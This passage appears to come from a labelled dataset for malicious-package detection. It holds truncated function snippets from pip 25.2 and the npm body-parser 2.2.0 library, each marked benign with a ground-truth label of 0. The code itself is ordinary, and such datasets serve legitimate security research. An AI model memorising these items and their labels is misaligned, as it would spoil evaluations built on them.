data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef __init__(self, isolated: bool, load_only: Kind | None = None) -> None:\n        super().__init__()\n\n        if load_only is not None and load_only not in VALID_LOAD_ONLY:\n            raise ConfigurationError(\n                \"Got invalid value for load_only - should be one of {}\".format(\n                    \", \".join(map(repr, VALID_LOAD_ONLY))\n                )\n            )\n        self.isolated = isolated\n        self.load_only = load_only\n\n        # Because we keep track of where we got the data from\n        self._parsers: dict[Kind, list[tuple[str, RawConfigParser]]] = {\n            variant: [] for variant in OVERRIDE_ORDER\n        }\n        self._config: dict[Kind, dict[str, dict[str, Any]]] = {\n            variant: {} for variant in OVERRIDE_ORDER\n        }\n        self._modified_parsers: list[tuple[str, RawConfigParser]] = []\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef load(self) -> None:\n        \"\"\"Loads configuration from configuration files and environment\"\"\"\n        self._load_config_files()\n        if not self.isolated:\n            self._load_environment_vars()\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef get_file_to_edit(self) -> str | None:\n        \"\"\"Returns the file with highest priority in configuration\"\"\"\n        assert self.load_only is not None, \"Need to be specified a file to be editing\"\n\n        try:\n            return self._get_parser_to_modify()[0]\n        except IndexError:\n            return None\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef items(self) -> Iterable[tuple[str, Any]]:\n        \"\"\"Returns key-value pairs like dict.items() representing the loaded\n        configuration\n        \"\"\"\n        return self._dictionary.items()\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef get_value(self, key: str) -> Any:\n        \"\"\"Get a value from the configuration.\"\"\"\n        orig_key = key\n        key = _normalize_name(key)\n        try:\n            clean_config: dict[str, Any] = {}\n            for file_values in self._dictionary.values():\n                clean_config.update(file_values)\n            return clean_config[key]\n        except KeyError:\n            # disassembling triggers a more useful error message than simply\n            # \"No such key\" in the case that the key isn't in the form command.option\n            _disassemble_key(key)\n            raise ConfigurationError(f\"No such key - {orig_key}\")\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef set_value(self, key: str, value: Any) -> None:\n        \"\"\"Modify a value in the configuration.\"\"\"\n        key = _normalize_name(key)\n        self._ensure_have_load_only()\n\n        assert self.load_only\n        fname, parser = self._get_parser_to_modify()\n\n        if parser is not None:\n            section, name = _disassemble_key(key)\n\n            # Modify the parser and the configuration\n            if not parser.has_section(section):\n                parser.add_section(section)\n            parser.set(section, name, value)\n\n        self._config[self.load_only].setdefault(fname, {})\n        self._config[self.load_only][fname][key] = value\n        self._mark_as_modified(fname, parser)\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef unset_value(self, key: str) -> None:\n        \"\"\"Unset a value in the configuration.\"\"\"\n        orig_key = key\n        key = _normalize_name(key)\n        self._ensure_have_load_only()\n\n        assert self.load_only\n        fname, parser = self._get_parser_to_modify()\n\n        if (\n            key not in self._config[self.load_only][fname]\n            and key not in self._config[self.load_only]\n        ):\n            raise ConfigurationError(f\"No such key - {orig_key}\")\n\n        if parser is not None:\n            section, name = _disassemble_key(key)\n            if not (\n                parser.has_section(section) and parser.remove_option(section, name)\n            ):\n                # The option was not removed.\n                raise ConfigurationError(\n                    \"Fatal Internal error [id=1]. Please report as a bug.\"\n                )\n\n            # The section may be empty after the option was removed.\n            if not parser.items(section):\n                parser.remove_section(section)\n            self._mark_as_modified(fname, parser)\n        try:\n            del self._config[self.load_only][fname][key]\n        except KeyError:\n            del self._config[self.load_only][key]\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef save(self) -> None:\n        \"\"\"Save the current in-memory state.\"\"\"\n        self._ensure_have_load_only()\n\n        for fname, parser in self._modified_parsers:\n            logger.info(\"Writing to %s\", fname)\n\n            # Ensure directory exists.\n            ensure_dir(os.path.dirname(fname))\n\n            # Ensure directory's permission(need to be writeable)\n            try:\n                with open(fname, \"w\") as f:\n                    parser.write(f)\n            except OSError as error:\n                raise ConfigurationError(\n                    f\"An error occurred while writing to the configuration file \"\n                    f\"{fname}: {error}\"\n                )\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef _ensure_have_load_only(self) -> None:\n        if self.load_only is None:\n            raise ConfigurationError(\"Needed a specific file to be modifying.\")\n        logger.debug(\"Will be working with %s variant only\", self.load_only)\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef _dictionary(self) -> dict[str, dict[str, Any]]:\n        \"\"\"A dictionary representing the loaded configuration.\"\"\"\n        # NOTE: Dictionaries are not populated if not loaded. So, conditionals\n        #       are not needed here.\n        retval = {}\n\n        for variant in OVERRIDE_ORDER:\n            retval.update(self._config[variant])\n\n        return retval\n==================================================\n\n# File: data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py (function)\ndef _load_config_files(self) -> None:\n        \"\"\"Loads configuration from configuration files\"\"\"\n        config_files = dict(self.iter_config_files())\n        if config_files[kinds.ENV][0:1] == [os.devnull]:\n            logger.debug(\n                \"Skipping loading configuration files due to \"\n                \"environment's PIP_CONFIG_FILE being os.devnull\"\n            )\n            return\n\n        for variant, files in config_files.items():\n            for fname in files:\n                # If there's specific variant set in `load_only`, load only\n                # that variant, not the others.\n                if self.load_only is not None and variant != self.load_only:\n                    logger.debug(\"Skipping file '%s' (variant: %s)\", fname, variant)\n                    continue\n\n                parser = self._load_file(variant, fname)\n\n                # Keeping track of the parsers used\n                self._parsers[variant].append((fname, parser))\n==================================================\n",
      "file_paths": [
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__init__.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__main__.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py"
      ],
      "individual_files": {
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/docs/pip_sphinxext.py": "def run(self) -> list[nodes.Node]:\n        node = nodes.paragraph()\n        node.document = self.state.document\n\n        os_variants = {\n            \"Linux\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"MacOS\": {\n                \"highlighter\": \"console\",\n                \"executable\": \"python\",\n                \"prompt\": \"$\",\n            },\n            \"Windows\": {\n                \"highlighter\": \"doscon\",\n                \"executable\": \"py\",\n                \"prompt\": \"C:>\",\n            },\n        }\n\n        if self.arguments:\n            assert self.arguments == [\"in-a-venv\"]\n            in_virtual_environment = True\n        else:\n            in_virtual_environment = False\n\n        lines = []\n        # Create a tab for each OS\n        for os, variant in os_variants.items():\n            # Unpack the values\n            prompt = variant[\"prompt\"]\n            highlighter = variant[\"highlighter\"]\n            if in_virtual_environment:\n                executable = \"python\"\n                pip_spelling = \"pip\"\n            else:\n                executable = variant[\"executable\"]\n                pip_spelling = f\"{executable} -m pip\"\n\n            # Substitute the various \"prompts\" into the correct variants\n            substitution_pipeline = [\n                (\n                    r\"(^|(?<=\\n))\\$ python\",\n                    f\"{prompt} {executable}\",\n                ),\n                (\n                    r\"(^|(?<=\\n))\\$ pip\",\n                    f\"{prompt} {pip_spelling}\",\n                ),\n            ]\n            content = self.block_text\n            for pattern, substitution in substitution_pipeline:\n                content = re.sub(pattern, substitution, content)\n\n            # Write the tab\n            lines.append(f\"````{{tab}} {os}\")\n            lines.append(f\"```{highlighter}\")\n            lines.append(f\"{content}\")\n            lines.append(\"```\")\n            lines.append(\"````\")\n\n        string_list = StringList(lines)\n        self.state.nested_parse(string_list, 0, node)\n        return [node]",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/build-project/build-project.py": "def ensure_directories(\n        self, env_dir: Union[str, bytes, \"PathLike[str]\", \"PathLike[bytes]\"]\n    ) -> SimpleNamespace:\n        context = super().ensure_directories(env_dir)\n        self.env_exec_cmd = context.env_exec_cmd\n        return context",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__init__.py": "def main(args: list[str] | None = None) -> int:\n    \"\"\"This is an internal API only meant for use by pip's own console scripts.\n\n    For additional details, see https://github.com/pypa/pip/issues/7498.\n    \"\"\"\n    from pip._internal.utils.entrypoints import _wrapper\n\n    return _wrapper(args)",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__pip-runner__.py": "def find_spec(self, fullname, path=None, target=None):  # type: ignore\n        if fullname != \"pip\":\n            return None\n\n        spec = PathFinder.find_spec(fullname, [PIP_SOURCES_ROOT], target)\n        assert spec, (PIP_SOURCES_ROOT, fullname)\n        return spec",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/__main__.py": "import os\nimport sys\n\n# Remove '' and current working directory from the first entry\n# of sys.path, if present to avoid using current directory\n# in pip commands check, freeze, install, list and show,\n# when invoked as python -m pip <command>\nif sys.path[0] in (\"\", os.getcwd()):\n    sys.path.pop(0)\n\n# If we are running from a wheel, add the wheel to sys.path\n# This allows the usage python pip-*.whl/pip install pip-*.whl\nif __package__ == \"\":\n    # __file__ is pip-*.whl/pip/__main__.py\n    # first dirname call strips of '/__main__.py', second strips off '/pip'\n    # Resulting path is the name of the wheel itself\n    # Add that to sys.path so we can import pip\n    path = os.path.dirname(os.path.dirname(__file__))\n    sys.path.insert(0, path)\n\nif __name__ == \"__main__\":\n    from pip._internal.cli.main import main as _main\n\n    sys.exit(_main())\n",
        "data/benign_samples/pypi/popular/pip/25.2/pip-25.2/src/pip/_internal/configuration.py": "def _load_config_files(self) -> None:\n        \"\"\"Loads configuration from configuration files\"\"\"\n        config_files = dict(self.iter_config_files())\n        if config_files[kinds.ENV][0:1] == [os.devnull]:\n            logger.debug(\n                \"Skipping loading configuration files due to \"\n                \"environment's PIP_CONFIG_FILE being os.devnull\"\n            )\n            return\n\n        for variant, files in config_files.items():\n            for fname in files:\n                # If there's specific variant set in `load_only`, load only\n                # that variant, not the others.\n                if self.load_only is not None and variant != self.load_only:\n                    logger.debug(\"Skipping file '%s' (variant: %s)\", fname, variant)\n                    continue\n\n                parser = self._load_file(variant, fname)\n\n                # Keeping track of the parsers used\n                self._parsers[variant].append((fname, parser))"
      },
      "package_size_bytes": 49474,
      "num_files": 50,
      "metadata": {
        "package_hash": "pypi_pip_25.2",
        "malicious_label": 0.0
      }
    },
    {
      "package_name": "body-parser",
      "ecosystem": "npm",
      "sample_type": "benign",
      "ground_truth_label": 0,
      "raw_content": "\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/index.js (function)\nfunction bodyParser () {\n  throw new Error('The bodyParser() generic has been split into individual middleware to use instead.')\n}\n\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js (function)\nfunction read (req, res, next, parse, debug, options) {\n  var length\n  var opts = options\n  var stream\n\n  // read options\n  var encoding = opts.encoding !== null\n    ? opts.encoding\n    : null\n  var verify = opts.verify\n\n  try {\n    // get the content stream\n    stream = contentstream(req, debug, opts.inflate)\n    length = stream.length\n    stream.length = undefined\n  } catch (err) {\n    return next(err)\n  }\n\n  // set raw-body options\n  opts.length = length\n  opts.encoding = verify\n    ? null\n  \n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js (function)\nfunction onfinished () {\n        next(createError(400, _error))\n      })\n      return\n    }\n\n    // verify\n    if (verify) {\n      try {\n        debug('verify body')\n        verify(req, res, body, encoding)\n      } catch (err) {\n        next(createError(403, err, {\n          body: body,\n          type: err.type || 'entity.verify.failed'\n        }))\n        return\n      }\n    }\n\n    // parse\n    var str = body\n    try {\n      debug('parse body')\n      str = typeof body !== 'string' && encoding !=\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js (function)\nfunction contentstream (req, debug, inflate) {\n  var encoding = (req.headers['content-encoding'] || 'identity').toLowerCase()\n  var length = req.headers['content-length']\n\n  debug('content-encoding \"%s\"', encoding)\n\n  if (inflate === false && encoding !== 'identity') {\n    throw createError(415, 'content encoding unsupported', {\n      encoding: encoding,\n      type: 'encoding.unsupported'\n    })\n  }\n\n  if (encoding === 'identity') {\n    req.length = length\n    return req\n  }\n\n  var stream = crea\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js (function)\nfunction createDecompressionStream (encoding, debug) {\n  switch (encoding) {\n    case 'deflate':\n      debug('inflate body')\n      return zlib.createInflate()\n    case 'gzip':\n      debug('gunzip body')\n      return zlib.createGunzip()\n    case 'br':\n      debug('brotli decompress body')\n      return zlib.createBrotliDecompress()\n    default:\n      throw createError(415, 'unsupported content encoding \"' + encoding + '\"', {\n        encoding: encoding,\n        type: 'encoding.unsupported'\n      })\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js (function)\nfunction dump (req, callback) {\n  if (onFinished.isFinished(req)) {\n    callback(null)\n  } else {\n    onFinished(req, callback)\n    req.resume()\n  }\n}\n\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js (function)\nfunction getCharset (req) {\n  try {\n    return (contentType.parse(req).parameters.charset || '').toLowerCase()\n  } catch {\n    return undefined\n  }\n}\n\n/**\n * Get the simple type checker.\n *\n * @param {string | string[]} type\n * @return {function}\n */\n\nfunction typeChecker (type) {\n  return function checkType (req) {\n    return Boolean(typeis(req, type))\n  }\n}\n\n/**\n * Normalizes the common options for all parsers.\n *\n * @param {object} options options to normalize\n * @param {string | string[] | f\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js (function)\nfunction typeChecker (type) {\n  return function checkType (req) {\n    return Boolean(typeis(req, type))\n  }\n}\n\n/**\n * Normalizes the common options for all parsers.\n *\n * @param {object} options options to normalize\n * @param {string | string[] | function} defaultType default content type(s) or a function to determine it\n * @returns {object}\n */\nfunction normalizeOptions (options, defaultType) {\n  if (!defaultType) {\n    // Parsers must define a default content type\n    throw new TypeError('defa\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js (function)\nfunction checkType (req) {\n    return Boolean(typeis(req, type))\n  }\n}\n\n/**\n * Normalizes the common options for all parsers.\n *\n * @param {object} options options to normalize\n * @param {string | string[] | function} defaultType default content type(s) or a function to determine it\n * @returns {object}\n */\nfunction normalizeOptions (options, defaultType) {\n  if (!defaultType) {\n    // Parsers must define a default content type\n    throw new TypeError('defaultType must be provided')\n  }\n\n  var i\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js (function)\nfunction normalizeOptions (options, defaultType) {\n  if (!defaultType) {\n    // Parsers must define a default content type\n    throw new TypeError('defaultType must be provided')\n  }\n\n  var inflate = options?.inflate !== false\n  var limit = typeof options?.limit !== 'number'\n    ? bytes.parse(options?.limit || '100kb')\n    : options?.limit\n  var type = options?.type || defaultType\n  var verify = options?.verify || false\n\n  if (verify !== false && typeof verify !== 'function') {\n    throw new Typ\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js (function)\nfunction raw (options) {\n  var { inflate, limit, verify, shouldParse } = normalizeOptions(options, 'application/octet-stream')\n\n  function parse (buf) {\n    return buf\n  }\n\n  return function rawParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      retur\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js (function)\nfunction parse (buf) {\n    return buf\n  }\n\n  return function rawParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldPa\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/raw.js (function)\nfunction rawParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next()\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction urlencoded (options) {\n  var { inflate, limit, verify, shouldParse } = normalizeOptions(options, 'application/x-www-form-urlencoded')\n\n  var defaultCharset = options?.defaultCharset || 'utf-8'\n  if (defaultCharset !== 'utf-8' && defaultCharset !== 'iso-8859-1') {\n    throw new TypeError('option defaultCharset must be either utf-8 or iso-8859-1')\n  }\n\n  // create the appropriate query parser\n  var queryparse = createQueryParser(options)\n\n  function parse (body, encoding) {\n    return bod\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction parse (body, encoding) {\n    return body.length\n      ? queryparse(body, encoding)\n      : {}\n  }\n\n  return function urlencodedParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction urlencodedParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n     \n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction createQueryParser (options) {\n  var extended = Boolean(options?.extended)\n  var parameterLimit = options?.parameterLimit !== undefined\n    ? options?.parameterLimit\n    : 1000\n  var charsetSentinel = options?.charsetSentinel\n  var interpretNumericEntities = options?.interpretNumericEntities\n  var depth = extended ? (options?.depth !== undefined ? options?.depth : 32) : 0\n\n  if (isNaN(parameterLimit) || parameterLimit < 1) {\n    throw new TypeError('option parameterLimit must be a positi\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction queryparse (body, encoding) {\n    var paramCount = parameterCount(body, parameterLimit)\n\n    if (paramCount === undefined) {\n      debug('too many parameters')\n      throw createError(413, 'too many parameters', {\n        type: 'parameters.too.many'\n      })\n    }\n\n    var arrayLimit = extended ? Math.max(100, paramCount) : 0\n\n    debug('parse ' + (extended ? 'extended ' : '') + 'urlencoding')\n    try {\n      return qs.parse(body, {\n        allowPrototypes: true,\n        arrayLimit: arr\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/urlencoded.js (function)\nfunction parameterCount (body, limit) {\n  var len = body.split('&').length\n\n  return len > limit ? undefined : len - 1\n}\n\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction json (options) {\n  var { inflate, limit, verify, shouldParse } = normalizeOptions(options, 'application/json')\n\n  var reviver = options?.reviver\n  var strict = options?.strict !== false\n\n  function parse (body) {\n    if (body.length === 0) {\n      // special-case empty json body, as it's a common client-side mistake\n      // TODO: maybe make this configurable or part of \"strict\" option\n      return {}\n    }\n\n    if (strict) {\n      var first = firstchar(body)\n\n      if (first !== '{' &&\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction parse (body) {\n    if (body.length === 0) {\n      // special-case empty json body, as it's a common client-side mistake\n      // TODO: maybe make this configurable or part of \"strict\" option\n      return {}\n    }\n\n    if (strict) {\n      var first = firstchar(body)\n\n      if (first !== '{' && first !== '[') {\n        debug('strict violation')\n        throw createStrictSyntaxError(body, first)\n      }\n    }\n\n    try {\n      debug('parse json')\n      return JSON.parse(body, reviver)\n    }\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction jsonParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next(\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction createStrictSyntaxError (str, char) {\n  var index = str.indexOf(char)\n  var partial = ''\n\n  if (index !== -1) {\n    partial = str.substring(0, index) + JSON_SYNTAX_CHAR\n\n    for (var i = index + 1; i < str.length; i++) {\n      partial += JSON_SYNTAX_CHAR\n    }\n  }\n\n  try {\n    JSON.parse(partial); /* istanbul ignore next */ throw new SyntaxError('strict violation')\n  } catch (e) {\n    return normalizeJsonSyntaxError(e, {\n      message: e.message.replace(JSON_SYNTAX_REGEXP, function (pla\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction firstchar (str) {\n  var match = FIRST_CHAR_REGEXP.exec(str)\n\n  return match\n    ? match[1]\n    : undefined\n}\n\n/**\n * Normalize a SyntaxError for JSON.parse.\n *\n * @param {SyntaxError} error\n * @param {object} obj\n * @return {SyntaxError}\n */\n\nfunction normalizeJsonSyntaxError (error, obj) {\n  var keys = Object.getOwnPropertyNames(error)\n\n  for (var i = 0; i < keys.length; i++) {\n    var key = keys[i]\n    if (key !== 'stack' && key !== 'message') {\n      delete error[key]\n    }\n  }\n\n  //\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/json.js (function)\nfunction normalizeJsonSyntaxError (error, obj) {\n  var keys = Object.getOwnPropertyNames(error)\n\n  for (var i = 0; i < keys.length; i++) {\n    var key = keys[i]\n    if (key !== 'stack' && key !== 'message') {\n      delete error[key]\n    }\n  }\n\n  // replace stack before message for Node.js 0.10 and below\n  error.stack = obj.stack.replace(error.message, obj.message)\n  error.message = obj.message\n\n  return error\n}\n\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js (function)\nfunction text (options) {\n  var { inflate, limit, verify, shouldParse } = normalizeOptions(options, 'text/plain')\n\n  var defaultCharset = options?.defaultCharset || 'utf-8'\n\n  function parse (buf) {\n    return buf\n  }\n\n  return function textParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      de\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js (function)\nfunction parse (buf) {\n    return buf\n  }\n\n  return function textParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldP\n==================================================\n\n# File: data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/types/text.js (function)\nfunction textParser (req, res, next) {\n    if (isFinished(req)) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    if (!('body' in req)) {\n      req.body = undefined\n    }\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next(\n==================================================\n",
      "file_paths": [
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/index.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/read.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js",
        "data/benign_samples/npm/popular/body-parser/2.2.0/package/lib/utils.js",
